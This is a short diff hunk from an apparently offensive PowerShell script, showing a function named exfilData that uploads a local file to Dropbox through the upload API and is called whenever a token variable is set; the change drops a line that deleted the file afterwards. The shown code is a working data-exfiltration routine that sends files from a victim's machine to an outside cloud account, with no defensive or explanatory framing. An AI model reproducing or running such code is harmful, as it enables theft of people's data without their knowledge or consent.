@@ -38,6 +38,5 @@ function exfilData {
     $headers.Add("Dropbox-API-Arg", $arg)
     $headers.Add("Content-Type", 'application/octet-stream')
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-    Remove-Item $FileName
     }
 if (-not ([string]::IsNullOrEmpty($db))){exfilData -f $FileName}
